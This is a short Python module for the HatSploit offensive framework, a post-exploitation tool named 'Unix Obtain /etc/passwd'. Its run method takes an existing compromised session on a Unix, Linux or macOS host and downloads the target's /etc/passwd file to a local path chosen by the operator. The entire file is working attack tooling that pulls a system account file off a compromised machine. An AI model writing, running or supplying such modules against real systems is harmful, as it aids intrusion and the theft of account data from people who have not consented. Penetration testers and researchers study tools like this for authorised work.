#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from hatsploit.utils.session import SessionTools


class HatSploitModule(Module, SessionTools):
    details = {
        'Name': "Unix Obtain /etc/passwd",
        'Module': "post/unix/shell/getpasswd",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer'
        ],
        'Description': "Get current session /etc/passwd file.",
        'Comments': [
            ''
        ],
        'Platform': "unix",
        'Rank': "medium"
    }

    options = {
        'SESSION': {
            'Description': "Session to run on.",
            'Value': None,
            'Type': "session->[unix,linux,macos]",
            'Required': True
        },
        'LFILE': {
            'Description': "Local path.",
            'Value': None,
            'Type': None,
            'Required': True
        }
    }

    def run(self):
        session, local_file = self.parse_options(self.options)
        session = self.get_session(session)

        if session:
            session.download('/etc/passwd', local_file)
